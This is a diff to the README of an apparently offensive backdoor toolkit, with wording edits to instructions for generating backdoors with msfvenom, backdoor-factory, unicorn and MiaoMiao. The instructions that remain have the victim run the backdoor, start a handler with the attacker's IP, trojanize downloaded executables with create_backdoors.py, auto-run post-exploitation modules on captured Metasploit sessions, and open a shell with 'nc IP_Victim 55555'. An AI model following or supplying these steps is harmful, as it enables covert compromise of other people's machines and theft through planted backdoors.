@@ -28,10 +28,10 @@ Run the backdoor.
 
 You will have a session of the victim's machine in Kali.
 
-If you have chose a backdoor created with msfvenom, backdoor-factory or unicorn, you will have a metasploit session in the victim. The metasploit's sessions can be configured to run post modules, meterpreter commands and shell commands in the config folder. This means that when you capture a metasploit sessions this modules and commands will run automatically.
+If you had chosen a backdoor created using msfvenom, backdoor-factory or unicorn, you will have a metasploit session of the victim. The metasploit's sessions can be configured to automatically run post modules, meterpreter commands and shell commands in the config folder. This means that when you capture a metasploit sessions this modules and commands will run automatically.
 
-## How to configure which post modules, meterpreter commands and shell commands to use
-You just have to go to the config folder and the you will find some folders of differents OS. Go inside anyone and you will find some text documents where you can write which post modules, meterpreters commands and shell comands to use when you capture a session in a machine that uses the OS selected.
+## How to configure which post modules, meterpreter commands and shell commands automatically run
+You just have to go to the config folder and there you will find some folders of differents OS. Go inside anyone and you will find some text documents where you can write which post modules, meterpreters commands and shell commands run when you capture a session in a machine that uses the OS selected.
 
 ## Install
 python ./install.py
@@ -56,14 +56,14 @@ python ./handler.py <IP_attacker>
 ## Backdoor-factory
 The backdoor-factory introduce the backdoor inside executables.
 
-If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)
+If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside ./BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)
 
 https://github.com/secretsquirrel/the-backdoor-factory.git
 
 ## MiaoMiao
 This backdoor open a port in the victims machine and the attacker connects to it. The default port is 55555
 To use this backdoor you have to run:
-+ Victim: Run src_backdoor > server_dist > newest_version
++ Victim: Run MiaoMiamo_folder/src_backdoor/server_dist/newest_version
 + Attacker: nc IP_Victim 55555 -vv
 
 https://github.com/marc0l92/MiaoMiao_project.git
